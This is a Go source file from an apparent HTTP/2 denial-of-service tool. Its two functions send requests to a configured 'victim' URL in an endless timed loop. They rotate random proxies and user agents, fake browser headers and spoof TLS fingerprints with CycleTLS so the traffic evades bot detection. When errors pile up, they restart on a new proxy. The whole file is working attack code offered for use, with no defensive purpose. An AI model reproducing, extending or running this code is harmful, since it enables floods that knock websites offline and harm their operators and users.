package main

import (
	"fmt"
	"github.com/Danny-Dasilva/CycleTLS/cycletls"
	"golang.org/x/net/http2"
	"math/rand"
	"net/http"
	url2 "net/url"
	"sync"
	"time"
)

var start = make(chan bool)

func HTTP2(wg *sync.WaitGroup) {
	var errs int
	errs = -1
restart:
	proxy := LoadedProxies[rand.Intn(len(LoadedProxies))]
	fmt.Println(proxy)
	url, err := url2.Parse(fmt.Sprintf("http://%s", proxy))
	if err != nil {
		fmt.Println("Error by Parsing Proxy. Check Proxies file.")
		return
	}
	x, err := url.Parse(Sys.Attack.Url)
	if err != nil {
		fmt.Println("Error by Parsing Victim. Check Victim url.")
		return
	}
	Http2ProxyConfig := &http.Transport{
		Proxy: http.ProxyURL(url),
	}
	_, err = http2.ConfigureTransports(Http2ProxyConfig)
	if err != nil {
		fmt.Println("Can't upgrade to http2")
		return
	}
	client := http.Client{
		Timeout:   time.Duration(Sys.HTTP2Timeout) * time.Millisecond,
		Transport: Http2ProxyConfig,
	}
	req, err := http.NewRequest(Sys.Attack.AttackMethod, Sys.Attack.Url, nil)
	if err != nil {
		fmt.Println("Can't build Request")
		return
	}
	if Sys.Attack.Host != "" {
		req.Header.Set("Host", Sys.Attack.Host)
	}
	if Sys.Attack.Cookie != nil {
		req.Header.Add("cookie", Sys.Attack.Cookie.(string))
	}
	req.Header.Set("User-Agent", UserAgents[rand.Intn(len(UserAgents))])
	req.Header.Set("authority", x.Host)
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("upgrade-insecure-requests", "1")
	req.Header.Set("cache-control", "max-age=0")
	req.Header.Set("sec-fetch-mode", "navigate")
	req.Header.Set("sec-fetch-user", "?1")
	req.Header.Set("sec-fetch-dest", "document")
	fmt.Println("before start")
	if errs == -1 {
		wg.Done()
		<-start
	}
	fmt.Println("started")
	for range time.Tick(time.Millisecond * time.Duration(1000.0/Sys.Attack.RequestsPerIP)) {
		fmt.Println("before request")
		_, err = client.Do(req)
		fmt.Println("request")
		if err != nil {
			errs++
			if errs > 10 {
				errs = 0
				goto restart
			}
		}
	}
}

func TLS_HTTP2(wg *sync.WaitGroup) {
	var errs int
	errs = -1
restart:
	proxy := LoadedProxies[rand.Intn(len(LoadedProxies))]
	headers := make(map[string]string)
	if Sys.Attack.Host != "" {
		headers["Host"] = Sys.Attack.Host
	}
	headers["sec-ch-ua-mobile"] = "?0"
	headers["upgrade-insecure-requests"] = "1"
	headers["cache-control"] = "max-age=0"
	headers["sec-fetch-mode"] = "navigate"
	headers["sec-fetch-user"] = "?1"
	headers["sec-fetch-dest"] = "document"
	client := cycletls.Init()
	options := cycletls.Options{
		Proxy:     "http://" + proxy,
		Ja3:       Sys.Attack.Ja3,
		UserAgent: UserAgents[rand.Intn(len(UserAgents))],
		//Headers:   headers,
		Timeout: Sys.HTTP2Timeout,
	}
	if errs == -1 {
		wg.Done()
		<-start
	}
	for range time.Tick(time.Millisecond * time.Duration(1000.0/Sys.Attack.RequestsPerIP)) {
		_, err := client.Do(Sys.Attack.Url, options, Sys.Attack.AttackMethod)
		fmt.Println("request")
		if err != nil {
			errs++
			if errs > 10 {
				errs = 0
				goto restart
			}
		}
	}
}
